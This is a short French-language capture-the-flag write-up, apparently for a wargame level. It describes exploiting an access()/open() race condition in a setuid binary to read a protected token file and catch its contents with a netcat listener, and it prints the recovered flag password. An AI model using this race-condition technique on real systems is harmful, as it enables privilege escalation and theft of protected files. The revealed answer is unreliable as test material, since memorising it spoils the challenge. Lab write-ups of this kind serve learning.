On voit un fichier level10 à la racine du home, qui s'execute avec les permissions de `flag10`, ainsi qu'un autre fichier `token` appartenant à flag10 et ne pouvant être lu que par ce dernier.
`./level10` nous indique qu'un argument doit être passé, ainsi qu'un host qui recevra le contenu du fichier.

La technique du lien symbolique ne fonctionne plus, mais on voit que access est appelé. Si aucune autre vérification est faite avant la lecture du fichier, une race condition peut peut-être être faite.

On donne les droits a /home/user dans level10, on fait 2 script, un pour faire la race condition et l'autre pour lancer l'executable en boucle, puis on les envoie avec la commande:

`scp -P 4242 level10/resources/{invert,spam}.bash level10@192.168.64.8:/home/user/level10`

Apres avoir recu les fichiers, on peut donc commencer a les lancer

```sh
$> echo "Wrong file" > a
$> chmod +rw a
$> ./invert.bash a token &
$> ./spam.bash 2>&1 > /dev/null &
```

Puis dans une autre fenetre on fait:

`nc -lk 6969 | grep -Ev "Wrong file|\.\*\(\ \)\*\."`.

On attends un peu...
Et on obtient le mot de passe de flag10 "woupa2yuojeeaaed06riuj63c".
